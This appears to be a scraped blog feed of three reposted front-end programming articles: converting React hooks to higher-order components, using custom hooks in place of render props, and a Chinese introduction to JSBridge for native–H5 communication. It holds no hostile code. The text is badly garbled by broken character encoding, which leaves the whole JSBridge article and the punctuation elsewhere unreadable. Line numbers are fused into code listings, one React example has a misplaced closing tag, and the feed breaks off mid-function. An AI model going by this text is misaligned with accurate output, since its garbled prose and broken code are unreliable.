2018? You realize you have to touch class components with lifecycles and this. That hook you wrote yesterday would fix the bug in a second, but since class components donâ€™t support hooks, youâ€™re stuck doing it â€œthe old wayâ€. What should you do? This article is going to show you two techniques to deal with these situations â€” creating HOCs from your hooks, and creating hooks from your HOCs. Wait, whatâ€™s a HOC? A HOC â€” or a higher order component â€” is a function that accepts a component, and returns a component that renders the passed component with a few extra props or capabilities. The React docs does a great job explaining them in more detail. Creating HOCs from your HooksWhy would you ever want to make your fancy, sleek Hooks into clunky, olâ€™ HOCs? Sounds like weâ€™re going backwards, right? Well, not really. Weâ€™re providing a migration path that lets us use our hook logic in class components. This way, we can start using new code in old components without rewriting potentially complex logic. Implementing a HOC that provide your Hook API is pretty straight forward. 1234const withMyHook = Comp =&gt; () =&gt; &#123; const hookData = useMyHook(); return &lt;Comp ...&#123;hookData&#125; &#123;...props&#125; /&gt;;&#125; In the code shown above, we create a function that receives a component as an argument and returns a new function component. This function component calls our hook and passes any return values to the passed component. If your hook implementation requires static data, you can pass it in as an argument: 1234const withMyHook = hookArgs =&gt; Comp =&gt; () =&gt; &#123; const hookData = useMyHook(hookArgs); return &lt;Comp &#123;...hookData&#125; &#123;...props&#125; /&gt;;&#125; Here, we pass our static data to our HOC, which returns another HOC. Itâ€™s known as currying, and itâ€™s basically functions returning functions. Youâ€™d use it like this: 123const MyDecoratedComponent = withMyHook(&#123; some: â€˜valueâ€™ &#125;)(MyComponent); If your hook needs data based on props, you might want to consider using the render prop pattern instead: 1234const MyHook = (props) =&gt; &#123; const hookData = useMyHook(props.relevantData); return props.children(hookData);&#125; Your implementation may vary â€” but you can put different implementations into the module you store your hook in, and export the HOC version or render prop version as named exports. You would use these HOCs the same way youâ€™d use any HOC â€” wrap the component you want to enhance with it. 1234class MyComponent extends React.Component &#123; â€¦&#125;;const MyEnhancedComponent = withMyHook(MyComponent); Creating Hooks from your HOCsIf youâ€™re working with any non-trivial app, your code base is most likely going to contain a few HOCs and render props components. As you continue to refactor your app, you might want to migrate away from these and recreate your existing shared logic as hooks. The biggest challenge in rewriting your HOCs and render prop based components to hooks is the change in paradigms. Previously, you thought in terms of lifecycle methods â€” now youâ€™ll have to think about renders and how props are changing. The always great Donavon created this nice chart that tries to map the two paradigms together: Flow chart courtesy of Donavon. Code available at https://github.com/donavon/hook-flow There arenâ€™t any generic patterns to follow here, but instead, Iâ€™ll show an example. By the end, youâ€™ll have a few ideas for your own rewrites. withScreenSize =&gt; useScreenSizewithScreenSize is a utility that provides the current screen size to our component. Itâ€™s implemented like this: 12345678910111213141516171819202122import React from â€˜reactâ€™;import debounce from â€˜debounceâ€™;const withScreenSize = Comp =&gt; &#123; return class extends React.Component &#123; state = &#123; width: null, height: null &#125;; updateScreenSize = debounce(() =&gt; &#123; this.setState(&#123; width: window.screen.width, height: window.screen.height &#125;); &#125;, 17); componentDidMount() &#123; window.addEventListener(â€˜resizeâ€™, this.updateScreenSize); &#125; componentWillUnmount() &#123; window.removeEventListener(â€˜resizeâ€™, this.updateScreenSize); &#125; render() &#123; return &lt;Comp &#123;...this.props&#125; screenSize=&#123;this.state&#125; /&gt; &#125; &#125;;&#125; We can implement this with Hooks like so: 12345678910111213141516171819202122import React from â€˜reactâ€™;import debounce from â€˜debounceâ€™;const useScreenSize = () =&gt; &#123; const [screenSize, setScreenSize] = React.useState(&#123; width: window.innerWidth, height: window.innerHeight, &#125;); const updateScreenSize = debounce(() =&gt; &#123; setScreenSize(&#123; width: window.innerWidth, height: window.innerHeight, &#125;); &#125;, 17); React.useEffect(() =&gt; &#123; window.addEventListener(â€˜resizeâ€™, updateScreenSize); return () =&gt; &#123; window.removeEventListener(â€˜resizeâ€™, updateScreenSize); &#125;; &#125;, []); return screenSize;&#125;; We store the width and height via the useState hook, and initialize it to be the window dimensions while mounting the component. Then, we re-implement the updateScreenSize method by using the setter from the useState call above. Finally, we apply the resize listener by using the useEffect hook. Notice that weâ€™re passing an empty dependency array â€” that means itâ€™ll only run once. Remember â€” if you want to keep supporting class components, you can write a wrapper HOC: 1234const withScreenSize = Comp =&gt; props =&gt; &#123; const screenSize = useScreenSize(); return &lt;Comp &#123;â€¦props&#125; screenSize=&#123;screenSize&#125; /&gt;;&#125;; Jump on the bandwagon, already!Hooks are here to stay, and theyâ€™re about to simplify your code base in a big way. In order to migrate away from existing patterns, however, youâ€™re going to have to compromise at times. This article shows how you can write wrappers around your existing HOCs and render props components, as well as how you can get started refactoring your existing HOCs to be Hooks.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Using custom hooks in place of "render props"]]></title>
    <url>%2F2020%2F02%2F25%2FWeb%E5%89%8D%E7%AB%AF%2FUsing%20custom%20hooks%20in%20place%20of%20%22render%20props%22%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://dev.to/emeka/using-custom-hooks-in-place-of-render-props-38mf One of the sweet but sometimes difficult to figure out part of React is reusing stateful logic across various components. Instead of rewriting a certain stateful logic whenever we need it, we would all love to write this logic just once and then reuse it in whatever components need it. A common pattern that makes this possible is â€œrender propsâ€.A component with a render prop takes a function that returns a React element and calls it instead of implementing its own render logic. This component can be termed the â€˜Container Componentâ€™ while the React element or component we are returning can be termed a â€˜presentation Componentâ€™. 12345678910111213141516// example 1&lt;Container render=&#123;prop =&gt; ( &lt;Presentation &#123;...props&#125; /&gt;)&#125; /&gt;// example 2&lt;Container children=&#123;prop =&gt; ( &lt;Presentation &#123;...props&#125; /&gt;)&#125; /&gt;// example 3&lt;Container&gt; &#123;props =&gt; ( &lt;Presentation &#123;...props&#125; /&gt; )&#125;&lt;/Container&gt; The three examples above implement the render props pattern, where â€˜Containerâ€™ is our container Component that renders a presentation componentâ€¦well, literally. We can put whatever stateful logic we need to reuse in the Container component, and the results along with an â€˜updating functionâ€™ if needed can be passed down to any other component it renders. Thatâ€™s â€œrender propsâ€ in a nutshell. What is the alternative?What if instead of having the container, we have a custom hook that implements this logic and returns the result with an â€˜updating functionâ€™. By â€˜updating functionâ€™ I mean a function that updates the state in the container or the result from our hook. How we can implement this is the exact reason we are here. Letâ€™s make use of a â€œcat and mouseâ€ example I found in the official React documentation for render props. We will take a look at the â€œrender propsâ€ example and try to refactor it to use a custom hook. Render Props ExampleIf we have a component that listens to the mouse movement and sets the pointer position in the state as shown below: 123456789101112131415161718192021222324252627class Mouse extends React.Component &#123; constructor(props) &#123; super(props); this.handleMouseMove = this.handleMouseMove.bind(this); this.state = &#123; x: 0, y: 0 &#125;; &#125; handleMouseMove(event) &#123; this.setState(&#123; x: event.clientX, y: event.clientY &#125;); &#125; render() &#123; return ( &lt;div style=&#123;&#123; height: &apos;100%&apos; &#125;&#125; onMouseMove=&#123;this.handleMouseMove&#125;&gt; &#123;/* Instead of providing a static representation of what &lt;Mouse&gt; renders, use the `render` prop to dynamically determine what to render. */&#125; &#123;this.props.render(this.state)&#125; &lt;/div&gt; ); &#125;&#125; Any component that needs to render elements based on the position of the mouse can be rendered by our mouse component. Letâ€™s define a Cat component that renders the image of a cat chasing the mouse pointer. 123456789class Cat extends React.Component &#123; render() &#123; const mouse = this.props.mouse; return ( &lt;img src=&quot;/cat.jpg&quot; style=&#123;&#123; position: &apos;absolute&apos;, left: mouse.x, top: mouse.y &#125;&#125; /&gt; ); &#125;&#125; We donâ€™t need to rewrite the logic for getting the pointer position but rather we can extend this logic from the Mouse component like this: 123456789101112class MouseTracker extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Move the mouse around!&lt;/h1&gt; &lt;Mouse render=&#123;mouse =&gt; ( &lt;Cat mouse=&#123;mouse&#125; /&gt; )&#125;/&gt; &lt;/div&gt; ); &#125;&#125; This will render the Cat component passing down the position of the mouse as a prop. We can reuse the logic in as many components as we need to. The hook alternativeWe are going to get rid of our â€˜Mouseâ€™ component and instead, create a hook to implement our mouse logic. 12345678910export function useMouse(initialValue = &#123;x:0, y:0&#125;) &#123; const [position, setPosition] = useState(initialValue); const handleMouseMove = (event) =&gt; &#123; setPosition(&#123; x: event.clientX, y: event.clientY &#125;); &#125; return [position, handleMouseMove];&#125; We have just defined a hook called useMouse. Itâ€™s a convention that the function name should start with â€˜useâ€™ so that people know it is a hook. Our useMouse hook returns the position of the mouse and a function to update that position. Letâ€™s see how we can use this in our Cat component. 12345678910function Cat() &#123; const [position, setMousePosition] = useMouse(); return ( &lt;div style=&#123;&#123; height: &apos;100%&apos; &#125;&#125; onMouseMove=&#123;setMousePosition&#125;&gt; &lt;img src=&quot;/cat.jpg&quot; style=&#123;&#123; position: &apos;absolute&apos;, left: position.x, top: position.y &#125;&#125; /&gt; ); &lt;/div&gt;&#125; What word comes to mind, simple?..neat?..concise? Maybe all three. Any component that needs to get the mouse position as it moves can use this hook.Using this pattern improves the readability and maintainability of complex react code and it will also help to prevent having very large and deeply nested component trees. We can reuse auth status, user information and even form handling logic by creating custom hooks. They can also be used in place of HOCs(Higher Order Components) in React.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSBridge åˆæ¢]]></title>
    <url>%2F2020%2F02%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FJSBridge%20%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e5248216fb9a07cb0314fc9 JSBridge çš„èµ·æºè¿‘äº›å¹´ï¼Œç§»åŠ¨ç«¯æ™®åŠåŒ–è¶Šæ¥è¶Šé«˜ï¼Œå¼€å‘è¿‡ç¨‹ä¸­é€‰ç”¨ Native è¿˜æ˜¯ H5 ä¸€ç›´æ˜¯çƒ­é—¨è¯é¢˜ã€‚Native å’Œ H5 éƒ½æœ‰ç€å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œä¸ºäº†æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ï¼Œå…¬å¸å®é™…é¡¹ç›®çš„å¼€å‘è¿‡ç¨‹ä¸­å¾€å¾€ä¼šèåˆä¸¤è€…è¿›è¡Œ Hybrid å¼€å‘ã€‚Native å’Œ H5 åˆ†å¤„ä¸¤åœ°ï¼Œçœ‹èµ·æ¥æ— æ³•è”ç³»ï¼Œé‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©åŒæ–¹ååŒå®ç°åŠŸèƒ½å‘¢ï¼Ÿ è¿™æ—¶æˆ‘ä»¬æƒ³åˆ°äº† Codova ï¼ŒCodova æä¾›äº†ä¸€ç»„ä¸è®¾å¤‡ç›¸å…³çš„ API ï¼Œæ˜¯æ—©æœŸ JS è°ƒç”¨åŸç”Ÿä»£ç æ¥å®ç°åŸç”ŸåŠŸèƒ½çš„å¸¸ç”¨æ–¹æ¡ˆã€‚ä¸è¿‡ JSBridge çœŸæ­£åœ¨å›½å†…å¹¿æ³›åº”ç”¨æ˜¯ç”±äºç§»åŠ¨äº’è”ç½‘çš„ç››è¡Œã€‚ JSBridge æ˜¯ä¸€ç§ JS å®ç°çš„ Bridgeï¼Œè¿æ¥ç€æ¡¥ä¸¤ç«¯çš„ Native å’Œ H5ã€‚å®ƒåœ¨ APP å†…æ–¹ä¾¿åœ°è®© Native è°ƒç”¨ JSï¼ŒJS è°ƒç”¨ Native ï¼Œæ˜¯åŒå‘é€šä¿¡çš„é€šé“ã€‚JSBridge ä¸»è¦æä¾›äº† JS è°ƒç”¨ Native ä»£ç çš„èƒ½åŠ›ï¼Œå®ç°åŸç”ŸåŠŸèƒ½å¦‚æŸ¥çœ‹æœ¬åœ°ç›¸å†Œã€æ‰“å¼€æ‘„åƒå¤´ã€æŒ‡çº¹æ”¯ä»˜ç­‰ã€‚ H5 ä¸ Native å¯¹æ¯” name H5 Native ç¨³å®šæ€§ è°ƒç”¨ç³»ç»Ÿæµè§ˆå™¨å†…æ ¸ï¼Œç¨³å®šæ€§è¾ƒå·® ä½¿ç”¨åŸç”Ÿå†…æ ¸ï¼Œæ›´åŠ ç¨³å®š çµæ´»æ€§ ç‰ˆæœ¬è¿­ä»£å¿«ï¼Œä¸Šçº¿çµæ´» è¿­ä»£æ…¢ï¼Œéœ€è¦åº”ç”¨å•†åº—å®¡æ ¸ï¼Œä¸Šçº¿é€Ÿåº¦å—é™åˆ¶ å—ç½‘é€Ÿ å½±å“ è¾ƒå¤§ è¾ƒå° æµç•…åº¦ æœ‰æ—¶åŠ è½½æ…¢ï¼Œç»™ç”¨æˆ·â€œå¡é¡¿â€çš„æ„Ÿè§‰ åŠ è½½é€Ÿåº¦å¿«ï¼Œæ›´åŠ æµç•… ç”¨æˆ·ä½“éªŒ åŠŸèƒ½å—æµè§ˆå™¨é™åˆ¶ï¼Œä½“éªŒæœ‰æ—¶è¾ƒå·® åŸç”Ÿç³»ç»Ÿ api ä¸°å¯Œï¼Œèƒ½å®ç°çš„åŠŸèƒ½è¾ƒå¤šï¼Œä½“éªŒè¾ƒå¥½ å¯ç§»æ¤æ€§ å…¼å®¹è·¨å¹³å°è·¨ç³»ç»Ÿï¼Œå¦‚ PC ä¸ ç§»åŠ¨ç«¯ï¼ŒiOS ä¸ Android å¯ç§»æ¤æ€§è¾ƒä½ï¼Œå¯¹äº iOS å’Œ Android éœ€è¦ç»´æŠ¤ä¸¤å¥—ä»£ç  JSBridge çš„åŒå‘é€šä¿¡åŸç† JS è°ƒç”¨ Native JS è°ƒç”¨ Native çš„å®ç°æ–¹å¼è¾ƒå¤šï¼Œä¸»è¦æœ‰æ‹¦æˆª URL Scheme ã€é‡å†™ prompt ã€æ³¨å…¥ API ç­‰æ–¹æ³•ã€‚ æ‹¦æˆª URL SchemeAndroid å’Œ iOS éƒ½å¯ä»¥é€šè¿‡æ‹¦æˆª URL Scheme å¹¶è§£æ Scheme æ¥å†³å®šæ˜¯å¦è¿›è¡Œå¯¹åº”çš„ Native ä»£ç é€»è¾‘å¤„ç†ã€‚ Android çš„è¯ï¼ŒWebview æä¾›äº† shouldOverrideUrlLoading æ–¹æ³•æ¥æä¾›ç»™ Native æ‹¦æˆª H5 å‘é€çš„ URL Scheme è¯·æ±‚ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516public class CustomWebViewClient extends WebViewClient &#123; @Override public boolean shouldOverrideUrlLoading(WebView view, String url) &#123; ...... // åœºæ™¯ä¸€ï¼š æ‹¦æˆªè¯·æ±‚ã€æ¥æ”¶ scheme if (url.equals(&quot;xxx&quot;)) &#123; // handle ... // callback view.loadUrl(&quot;javascript:setAllContent(&quot; + json + &quot;);&quot;) return true; &#125; return super.shouldOverrideUrlLoading(url); &#125;&#125; iOS çš„ WKWebview å¯ä»¥æ ¹æ®æ‹¦æˆªåˆ°çš„ URL Scheme å’Œå¯¹åº”çš„å‚æ•°æ‰§è¡Œç›¸å…³çš„æ“ä½œã€‚ä»£ç å¦‚ä¸‹ï¼š 123456- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler&#123; if ([navigationAction.request.URL.absoluteString hasPrefix:@&quot;xxx&quot;]) &#123; [[UIApplication sharedApplication] openURL:navigationAction.request.URL]; &#125; decisionHandler(WKNavigationActionPolicyAllow);&#125; è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯ä¸å­˜åœ¨æ¼æ´é—®é¢˜ã€ä½¿ç”¨çµæ´»ï¼Œå¯ä»¥å®ç° H5 å’Œ Native é¡µé¢çš„æ— ç¼åˆ‡æ¢ã€‚ä¾‹å¦‚åœ¨æŸä¸€é¡µé¢éœ€è¦å¿«é€Ÿä¸Šçº¿çš„æƒ…å†µä¸‹ï¼Œå…ˆå¼€å‘å‡º H5 é¡µé¢ã€‚æŸä¸€é“¾æ¥å¡«å†™çš„æ˜¯ H5 é“¾æ¥ï¼Œåœ¨å¯¹åº”çš„ Native é¡µé¢å¼€å‘å®Œæˆå‰å…ˆè·³è½¬è‡³ H5 é¡µé¢ï¼Œå¾… Native é¡µé¢å¼€å‘å®Œåå†è¿›è¡Œæ‹¦æˆªï¼Œè·³è½¬è‡³ Native é¡µé¢ï¼Œæ­¤æ—¶ H5 çš„é“¾æ¥æ— éœ€è¿›è¡Œä¿®æ”¹ã€‚ä½†æ˜¯ä½¿ç”¨ iframe.src æ¥å‘é€ URL Scheme éœ€è¦å¯¹ URL çš„é•¿åº¦ä½œæ§åˆ¶ï¼Œä½¿ç”¨å¤æ‚ï¼Œé€Ÿåº¦è¾ƒæ…¢ã€‚ é‡å†™ prompt ç­‰åŸç”Ÿ JS æ–¹æ³•Android 4.2 ä¹‹å‰æ³¨å…¥å¯¹è±¡çš„æ¥å£æ˜¯ addJavascriptInterface ï¼Œä½†æ˜¯ç”±äºå®‰å…¨åŸå› æ…¢æ…¢ä¸è¢«ä½¿ç”¨ã€‚ä¸€èˆ¬ä¼šé€šè¿‡ä¿®æ”¹æµè§ˆå™¨çš„éƒ¨åˆ† Window å¯¹è±¡çš„æ–¹æ³•æ¥å®Œæˆæ“ä½œã€‚ä¸»è¦æ˜¯æ‹¦æˆª alertã€confirmã€promptã€console.log å››ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«è¢« Webview çš„ onJsAlertã€onJsConfirmã€onConsoleMessageã€onJsPrompt ç›‘å¬ã€‚å…¶ä¸­ onJsPrompt ç›‘å¬çš„ä»£ç å¦‚ä¸‹ï¼š 12345public boolean onJsPrompt(WebView view, String origin, String message, String defaultValue, final JsPromptResult result) &#123; String handledRet = parentEngine.bridge.promptOnJsPrompt(origin, message, defaultValue); xxx; return true;&#125; iOS ç”±äºå®‰å…¨æœºåˆ¶ï¼ŒWKWebView å¯¹ alertã€confirmã€prompt ç­‰æ–¹æ³•åšäº†æ‹¦æˆªï¼Œå¦‚æœé€šè¿‡æ­¤æ–¹å¼è¿›è¡Œ Native ä¸ JS äº¤äº’ï¼Œéœ€è¦å®ç° WKWebView çš„ä¸‰ä¸ª WKUIDelegate ä»£ç†æ–¹æ³•ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213-(void)webView:(WKWebView *)webView runJavaScriptAlertPanelWithMessage:(NSString *)message initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(void))completionHandler&#123; UIAlertController *alertController = [UIAlertController alertControllerWithTitle:nil message:message?:@&quot;&quot; preferredStyle:UIAlertControllerStyleAlert]; [alertController addAction:([UIAlertAction actionWithTitle:@&quot;ç¡®è®¤&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) &#123; completionHandler(); &#125;])]; [self presentViewController:alertController animated:YES completion:nil];&#125; ä½¿ç”¨è¯¥æ–¹å¼æ—¶ï¼Œå¯ä»¥ä¸ Android å’Œ iOS çº¦å®šå¥½ä½¿ç”¨ä¼ å‚çš„æ ¼å¼ï¼Œè¿™æ · H5 å¯ä»¥æ— éœ€è¯†åˆ«å®¢æˆ·ç«¯ï¼Œä¼ å…¥ä¸åŒå‚æ•°ç›´æ¥è°ƒç”¨ Native å³å¯ã€‚å‰©ä¸‹çš„äº¤ç»™å®¢æˆ·ç«¯è‡ªå·±å»æ‹¦æˆªç›¸åŒçš„æ–¹æ³•ï¼Œè¯†åˆ«ç›¸åŒçš„å‚æ•°ï¼Œè¿›è¡Œè‡ªå·±çš„å¤„ç†é€»è¾‘å³å¯å®ç°å¤šç«¯è¡¨ç°ä¸€è‡´ã€‚å¦‚ï¼š 1alert(&quot;ç¡®å®šxxx?&quot;, &quot;å–æ¶ˆ&quot;, &quot;ç¡®å®š&quot;, callback()); å¦å¤–ï¼Œå¦‚æœèƒ½ä¸ Native ç¡®å®šå¥½æ–¹æ³•åã€ä¼ å‚ç­‰è°ƒç”¨çš„åè®®è§„èŒƒï¼Œè¿™æ ·å…¶å®ƒæ ¼å¼çš„ prompt ç­‰æ–¹æ³•æ˜¯ä¸ä¼šè¢«è¯†åˆ«çš„ï¼Œèƒ½èµ·åˆ°éš”ç¦»çš„ä½œç”¨ã€‚ æ³¨å…¥ APIåŸºäº Webview æä¾›çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥å‘ Window ä¸Šæ³¨å…¥å¯¹è±¡æˆ–æ–¹æ³•ã€‚JS é€šè¿‡è¿™ä¸ªå¯¹è±¡æˆ–æ–¹æ³•è¿›è¡Œè°ƒç”¨æ—¶ï¼Œæ‰§è¡Œå¯¹åº”çš„é€»è¾‘æ“ä½œï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ Native çš„æ–¹æ³•ã€‚ä½¿ç”¨è¯¥æ–¹å¼æ—¶ï¼ŒJS éœ€è¦ç­‰åˆ° Native æ‰§è¡Œå®Œå¯¹åº”çš„é€»è¾‘åæ‰èƒ½è¿›è¡Œå›è°ƒé‡Œé¢çš„æ“ä½œã€‚ Android çš„ Webview æä¾›äº† addJavascriptInterface æ–¹æ³•ï¼Œæ”¯æŒ Android 4.2 åŠä»¥ä¸Šç³»ç»Ÿã€‚ 123456789101112gpcWebView.addJavascriptInterface(new JavaScriptInterface(), &apos;nativeApiBridge&apos;); public class JavaScriptInterface &#123; Context mContext; JavaScriptInterface(Context c) &#123; mContext = c; &#125; public void share(String webMessage)&#123; // Native é€»è¾‘ &#125;&#125; JS è°ƒç”¨ç¤ºä¾‹ï¼š 1window.NativeApi.share(xxx); iOS çš„ UIWebview æä¾›äº† JavaScriptScore æ–¹æ³•ï¼Œæ”¯æŒ iOS 7.0 åŠä»¥ä¸Šç³»ç»Ÿã€‚WKWebview æä¾›äº† window.webkit.messageHandlers æ–¹æ³•ï¼Œæ”¯æŒ iOS 8.0 åŠä»¥ä¸Šç³»ç»Ÿã€‚UIWebview åœ¨å‡ å¹´å‰å¸¸ç”¨ï¼Œç›®å‰å·²ä¸å¸¸è§ã€‚ä»¥ä¸‹ä¸ºåˆ›å»º WKWebViewConfiguration å’Œ åˆ›å»º WKWebView ç¤ºä¾‹ï¼š 12345678910111213141516171819WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];WKPreferences *preferences = [WKPreferences new];preferences.javaScriptCanOpenWindowsAutomatically = YES;preferences.minimumFontSize = 40.0;configuration.preferences = preferences; - (void)viewWillAppear:(BOOL)animated&#123; [super viewWillAppear:animated]; [self.webView.configuration.userContentController addScriptMessageHandler:self name:@&quot;share&quot;]; [self.webView.configuration.userContentController addScriptMessageHandler:self name:@&quot;pickImage&quot;];&#125;- (void)viewWillDisappear:(BOOL)animated&#123; [super viewWillDisappear:animated]; [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@&quot;share&quot;]; [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@&quot;pickImage&quot;];&#125; JS è°ƒç”¨ç¤ºä¾‹ï¼š 1window.webkit.messageHandlers.share.postMessage(xxx); Native è°ƒç”¨ JS Native è°ƒç”¨ JS æ¯”è¾ƒç®€å•ï¼Œåªè¦ H5 å°† JS æ–¹æ³•æš´éœ²åœ¨ Window ä¸Šç»™ Native è°ƒç”¨å³å¯ã€‚ Android ä¸­ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼å®ç°ã€‚åœ¨ 4.4 ä»¥å‰ï¼Œé€šè¿‡ loadUrl æ–¹æ³•ï¼Œæ‰§è¡Œä¸€æ®µ JS ä»£ç æ¥å®ç°ã€‚åœ¨ 4.4 ä»¥åï¼Œå¯ä»¥ä½¿ç”¨ evaluateJavascript æ–¹æ³•å®ç°ã€‚loadUrl æ–¹æ³•ä½¿ç”¨èµ·æ¥æ–¹ä¾¿ç®€æ´ï¼Œä½†æ˜¯æ•ˆç‡ä½æ— æ³•è·å¾—è¿”å›ç»“æœä¸”è°ƒç”¨çš„æ—¶å€™ä¼šåˆ·æ–° WebViewã€‚evaluateJavascript æ–¹æ³•æ•ˆç‡é«˜è·å–è¿”å›å€¼æ–¹ä¾¿ï¼Œè°ƒç”¨æ—¶å€™ä¸åˆ·æ–°WebViewï¼Œä½†æ˜¯åªæ”¯æŒ Android 4.4+ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š 1234567webView.loadUrl(&quot;javascript:&quot; + javaScriptString);webView.evaluateJavascript(javaScriptString, new ValueCallback&lt;String&gt;() &#123; @Override public void onReceiveValue(String value)&#123; xxx &#125;&#125;); iOS åœ¨ WKWebview ä¸­å¯ä»¥é€šè¿‡ evaluateJavaScript:javaScriptString æ¥å®ç°ï¼Œæ”¯æŒ iOS 8.0 åŠä»¥ä¸Šç³»ç»Ÿã€‚ 123456789// swiftfunc evaluateJavaScript(_ javaScriptString: String, completionHandler: ((Any?, Error?) -&gt; Void)? = nil)// javaScriptString éœ€è¦è°ƒç”¨çš„ JS ä»£ç // completionHandler æ‰§è¡Œåçš„å›è°ƒå¤åˆ¶ä»£ç // objective-c[jsContext evaluateJavaScript:@&quot;ZcyJsBridge(ev, data)&quot;] JSBridge çš„ä½¿ç”¨ å¦‚ä½•å¼•ç”¨ ç”± H5 å¼•ç”¨ åœ¨æˆ‘å¸ç§»åŠ¨ç«¯åˆæœŸç‰ˆæœ¬æ—¶é‡‡ç”¨çš„æ˜¯è¯¥æ–¹å¼ï¼Œé‡‡ç”¨æœ¬åœ°å¼•å…¥ npm åŒ…çš„æ–¹å¼è¿›è¡Œè°ƒç”¨ã€‚è¿™ç§æ–¹å¼å¯ä»¥ç¡®å®š JSBridge æ˜¯å­˜åœ¨çš„ï¼Œå¯ç›´æ¥è°ƒç”¨ Native æ–¹æ³•ã€‚ä½†æ˜¯å¦‚æœåæœŸ Bridge çš„å®ç°æ–¹å¼æ”¹å˜ï¼ŒåŒæ–¹éœ€è¦åšæ›´å¤šçš„å…¼å®¹ï¼Œç»´æŠ¤æˆæœ¬é«˜ ç”± Native æ³¨å…¥ è¿™æ˜¯å½“å‰æˆ‘å¸ç§»åŠ¨ç«¯é€‰ç”¨çš„æ–¹å¼ã€‚åœ¨è€ƒè™‘åˆ°åæœŸä¸šåŠ¡éœ€è¦çš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œäº†é‡æ–°è®¾è®¡ï¼Œé€‰ç”¨ Native æ³¨å…¥çš„æ–¹å¼æ¥å¼•ç”¨ JSBridgeã€‚è¿™æ ·æœ‰åˆ©äºä¿æŒ API ä¸ Native çš„ä¸€è‡´æ€§ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯åœ¨ Native æ³¨å…¥çš„æ–¹æ³•å’Œæ—¶æœºéƒ½å—é™ï¼ŒJS è°ƒç”¨ Native ä¹‹å‰éœ€è¦å…ˆåˆ¤æ–­ JSBridge æ˜¯å¦æ³¨å…¥æˆåŠŸ ä½¿ç”¨è§„èŒƒ H5 è°ƒç”¨ Native æ–¹æ³•çš„ä¼ªä»£ç å®ä¾‹ï¼Œå¦‚ï¼š 12345678910111213141516171819params = &#123; api_version: &quot;xxx&quot;, // API ç‰ˆæœ¬ title: &quot;xxx&quot;, // æ ‡é¢˜ filename: &quot;xxx&quot;, // æ–‡ä»¶åç§° image: &quot;xxx&quot;, // å›¾ç‰‡é“¾æ¥ url: &quot;xxx&quot;, // ç½‘å€é“¾æ¥ success: function (res) &#123; xxx; // è°ƒç”¨æˆåŠŸåæ‰§è¡Œ &#125;, fail: function (err) &#123; if (err.code == &apos;-2&apos;) &#123; fail &amp;&amp; fail(err); // è°ƒç”¨äº†å½“å‰å®¢æˆ·ç«¯ä¸­ä¸å­˜åœ¨çš„ API ç‰ˆæœ¬ &#125; else &#123; const msg = err.msg; //å¼‚å¸¸ä¿¡æ¯ Toast.fail(msg); &#125; &#125;&#125;;window.NativeApi.share(params); ä»¥ä¸‹ç®€è¦åˆ—å‡ºé€šç”¨æ–¹æ³•çš„æŠ½è±¡ï¼Œç›®å‰åŸºæœ¬éµå¾ªä»¥ä¸‹è§„èŒƒè¿›è¡ŒåŒç«¯é€šä¿¡ã€‚ 123456789101112window.NativeApi.xxx(&#123; api_version:&apos;&apos;, name: &quot;xxx&quot;, path: &quot;xxx&quot;, id: &quot;xxx&quot;, success: function (res) &#123; console.log(res); &#125;, fail: function (err) &#123; console.log(err); &#125;&#125;); ç”±äºåˆæœŸç‰ˆæœ¬é€‰æ‹©äº†ç”± H5 æœ¬åœ°å¼•ç”¨ JSBridgeï¼ŒåæœŸé‡‡ç”¨ Native æ³¨å…¥çš„æ–¹å¼ã€‚ç°æœ‰çš„ H5 éœ€è¦å¯¹å„ç§æƒ…å†µåšå…¼å®¹ï¼Œé€»è¾‘æŠ½è±¡å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223reqNativeBridge(vm, fn) &#123; if (!isApp()) &#123; // å¦‚æœä¸åœ¨ APP å†…è¿›è¡Œè°ƒç”¨ vm.$dialog.alert(&#123; message: &quot;æ­¤åŠŸèƒ½éœ€è¦è®¿é—® APP æ‰èƒ½ä½¿ç”¨&quot;, &#125;); &#125; else &#123; if (!window.NativeApi) &#123; // é’ˆå¯¹åˆæœŸç‰ˆæœ¬ vm.$dialog.alert(&#123; message: &quot;è¯·æ›´æ–°åˆ°æœ€æ–° APP ä½¿ç”¨è¯¥åŠŸèƒ½&quot;, &#125;); &#125; else &#123; // æ­¤å¤„åªé’ˆå¯¹â€œè°ƒç”¨äº†å½“å‰å®¢æˆ·ç«¯ä¸­ä¸å­˜åœ¨çš„ API ç‰ˆæœ¬â€çš„æŠ¥é”™è¿›è¡Œå¤„ç† // 